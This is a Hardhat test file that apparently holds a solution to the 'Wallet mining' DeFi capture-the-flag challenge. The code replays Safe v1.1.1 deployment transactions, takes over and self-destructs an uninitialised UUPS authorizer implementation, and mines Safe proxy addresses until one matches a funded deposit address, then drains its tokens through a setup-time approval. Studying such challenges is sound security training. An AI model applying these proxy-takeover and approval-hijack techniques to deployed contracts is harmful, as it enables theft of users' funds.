const { ethers, upgrades } = require('hardhat');
const { expect } = require('chai');
const safe111AndFactoryConfig = require("./safe111AndFactoryConfig.json");

describe('[Challenge] Wallet mining', function () {
    let deployer, player;
    let token, authorizer, walletDeployer;
    let initialWalletDeployerTokenBalance;

    const DEPOSIT_ADDRESS = '0x9b6fb606a9f5789444c17768c6dfcf2f83563801';
    const DEPOSIT_TOKEN_AMOUNT = 20000000n * 10n ** 18n;

    // Since this is Safe v1.1.1 we cannot use the contracts already included
    // in this CTF repo. Instead look for the signatures for this factory/wallet contracts
    // using the known addresses on etherscan.io
    const SAFE111_ABI = [
        "event ProxyCreation(address)",
        "event Approval(address indexed _owner, address indexed _spender, uint256 _value)",

        "function setup(address[] calldata, uint256, address, bytes calldata, address, address, uint256, address payable)",
        "function isOwner(address owner) public view returns (bool)",
        // "function execTransaction(address to, uint256 value, bytes calldata data, uint256 operation, uint256 safeTxGas, uint256 baseGas, uint256 gasPrice, address gasToken, address payable refundReceiver, bytes calldata signatures ) returns (bool success)",
        // "function getTransactionHash(address to, uint256 value, bytes memory data, uint256 operation, uint256 safeTxGas, uint256 baseGas, uint256 gasPrice, address gasToken, address refundReceiver, uint256 _nonce)",
        "function execTransactionFromModule(address to, uint256 value, bytes memory data, uint256 operation) public returns (bool success)",

        "function approveSafe(address token, address spender, uint256 amount) external returns (bool)",
        "function approve(address, uint256)",
        "function transferFrom(address, address, uint256)"
    ];

    async function deploySafe() {
        let provider = ethers.provider;
        let safeDeployer = safe111AndFactoryConfig.deployer;

        let trn = await player.sendTransaction({ to: safeDeployer, value: 1n * 10n ** 18n });
        let receipt = await trn.wait();

        trn = await provider.sendTransaction(safe111AndFactoryConfig.deploymentTx);
        receipt = await trn.wait();
        console.log();
        console.log(`Safe Master:  ${receipt.contractAddress}`);

        trn = await provider.sendTransaction(safe111AndFactoryConfig.configTx);
        receipt = await trn.wait();
        trn = await provider.sendTransaction(safe111AndFactoryConfig.factoryDeploymentTx);
        receipt = await trn.wait();
        console.log(`Safe Factory:  ${receipt.contractAddress}`);
    }

    async function newWallet(attackAddr) {
        const ifaceSafe = new ethers.utils.Interface(SAFE111_ABI);

        // Encode call to Gnosis Safe setup function
        const owners = [player.address];
        const threshold = 1;
        const to = attackAddr;
        const data = ifaceSafe.encodeFunctionData('approveSafe', [token.address, player.address, DEPOSIT_TOKEN_AMOUNT]);
        const fallbackHandler = "0x0000000000000000000000000000000000000000";
        const paymentToken = "0x0000000000000000000000000000000000000000";
        const payment = 0;
        const paymentReceiver = "0x0000000000000000000000000000000000000000";
        const setupCall = ifaceSafe.encodeFunctionData('setup', [owners, threshold, to, data, fallbackHandler, paymentToken, payment, paymentReceiver]);

        let trn = await walletDeployer.connect(player).drop(setupCall);
        let receipt = await trn.wait();

        // The expected event id, topic:
        let eventId = ethers.utils.id("ProxyCreation(address)");
        console.log();
        console.log(`ProxyCreation(address) = ${eventId}`);

        const approveInfo = ifaceSafe.parseLog(receipt.logs[0])
        const eventInfo = ifaceSafe.parseLog(receipt.logs[1])
        const addrSafe = eventInfo.args[0];
        // console.log();
        // console.log(eventInfo);
        // console.log(approveInfo);
        console.log();
        console.log(`New safe wallet address: ${addrSafe}`);

        const walletSafe = await ethers.getContractAt(SAFE111_ABI, addrSafe, player);
        let isOwnerCheck = await walletSafe.isOwner(player.address);
        console.log(`player isOwnerCheck: ${isOwnerCheck}`);
        expect(isOwnerCheck).to.be.true;

        isOwnerCheck = await walletSafe.isOwner(deployer.address);
        console.log(`deployer isOwnerCheck: ${isOwnerCheck}`);
        expect(isOwnerCheck).to.be.false;

        return addrSafe;
    }

    async function killAuthorizerImpl() {
        let addrImp = await ethers.provider.getStorageAt(
            authorizer.address,
            "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc");

        addrImp = "0x" + addrImp.slice(-40);
        console.log();
        console.log(`Authorizer Implementation: ${addrImp}`);

        let impl = (await ethers.getContractFactory('AuthorizerUpgradeable', player)).attach(addrImp);
        await impl.init([player.address], [player.address]);

        let newOwner = await impl.owner();
        console.log(`Owner: ${newOwner}`);

        const authAttackFactory = await ethers.getContractFactory('AttackAuthorizer', player);
        const authAttack = await authAttackFactory.deploy();

        const dieNowCall = authAttack.interface.encodeFunctionData('dieNow', []);
        console.log(`Encoded dieNowCall ${dieNowCall}`);

        await impl.upgradeToAndCall(authAttack.address, dieNowCall);

        //Check what happens whenever we call can on the WalletDeployer now
        const can1 = await walletDeployer.can(player.address, DEPOSIT_ADDRESS);
        const can2 = await walletDeployer.can(player.address, "0x0000000000000000000000000000000000000000");
        console.log(`Is can() broken? ${(can1 && can2)}`)
    }

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, ward, player] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy authorizer with the corresponding proxy
        authorizer = await upgrades.deployProxy(
            await ethers.getContractFactory('AuthorizerUpgradeable', deployer),
            [[ward.address], [DEPOSIT_ADDRESS]], // initialization data
            { kind: 'uups', initializer: 'init' }
        );

        expect(await authorizer.owner()).to.eq(deployer.address);
        expect(await authorizer.can(ward.address, DEPOSIT_ADDRESS)).to.be.true;
        expect(await authorizer.can(player.address, DEPOSIT_ADDRESS)).to.be.false;

        // Deploy Safe Deployer contract
        walletDeployer = await (await ethers.getContractFactory('WalletDeployer', deployer)).deploy(
            token.address
        );
        expect(await walletDeployer.chief()).to.eq(deployer.address);
        expect(await walletDeployer.gem()).to.eq(token.address);

        // Set Authorizer in Safe Deployer
        await walletDeployer.rule(authorizer.address);
        expect(await walletDeployer.mom()).to.eq(authorizer.address);

        await expect(walletDeployer.can(ward.address, DEPOSIT_ADDRESS)).not.to.be.reverted;
        await expect(walletDeployer.can(player.address, DEPOSIT_ADDRESS)).to.be.reverted;

        // Fund Safe Deployer with tokens
        initialWalletDeployerTokenBalance = (await walletDeployer.pay()).mul(43);
        await token.transfer(
            walletDeployer.address,
            initialWalletDeployerTokenBalance
        );

        // Ensure these accounts start empty
        expect(await ethers.provider.getCode(DEPOSIT_ADDRESS)).to.eq('0x');
        expect(await ethers.provider.getCode(await walletDeployer.fact())).to.eq('0x');
        expect(await ethers.provider.getCode(await walletDeployer.copy())).to.eq('0x');

        // Deposit large amount of DVT tokens to the deposit address
        await token.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Ensure initial balances are set correctly
        expect(await token.balanceOf(DEPOSIT_ADDRESS)).eq(DEPOSIT_TOKEN_AMOUNT);
        expect(await token.balanceOf(walletDeployer.address)).eq(initialWalletDeployerTokenBalance);
        expect(await token.balanceOf(player.address)).eq(0);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        let ownerAddr = await authorizer.owner();
        console.log(`Authorizer owner: ${ownerAddr}`);

        let balanceBefore = await token.balanceOf(player.address);
        console.log(`Player balance before ${balanceBefore}`);

        let attackSafe = await (await ethers.getContractFactory('AttackMinedSafe', deployer)).deploy();
        console.log(`Attack safe           ${attackSafe.address}`);

        await deploySafe();

        console.log();
        await killAuthorizerImpl();

        const DEPOSIT_ADDRESS_LOW = DEPOSIT_ADDRESS.toLowerCase();
        for (cnt = 0; cnt < 100; ++cnt) {
            console.log();
            console.log(`Creating wallet #${cnt}`);

            let addr = await newWallet(attackSafe.address);
            if (addr.toLowerCase() == DEPOSIT_ADDRESS_LOW)
                break;
        }

        await token.connect(player).transferFrom(DEPOSIT_ADDRESS, player.address, DEPOSIT_TOKEN_AMOUNT);

        let balanceAfter = await token.balanceOf(player.address);
        console.log();
        console.log(`Player Address:      ${player.address}`);
        console.log(`Deployer Address:    ${deployer.address}`);
        console.log(`Token Address:       ${token.address}`);
        console.log(`Player balance after ${balanceAfter}`);

    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Factory account must have code
        expect(
            await ethers.provider.getCode(await walletDeployer.fact())
        ).to.not.eq('0x', "FAILED: no wallet factory contract.");

        // Master copy account must have code
        expect(
            await ethers.provider.getCode(await walletDeployer.copy())
        ).to.not.eq('0x', "FAILED: no master wallet contract.");

        // Deposit account must have code
        expect(
            await ethers.provider.getCode(DEPOSIT_ADDRESS)
        ).to.not.eq('0x', `FAILED: no contract at ${DEPOSIT_ADDRESS}.`);

        // The deposit address and the Safe Deployer contract must not hold tokens
        expect(
            await token.balanceOf(DEPOSIT_ADDRESS)
        ).to.eq(0);
        expect(
            await token.balanceOf(walletDeployer.address)
        ).to.eq(0);

        // Player must own all tokens
        expect(
            await token.balanceOf(player.address)
        ).to.eq(initialWalletDeployerTokenBalance.add(DEPOSIT_TOKEN_AMOUNT));
    });
});
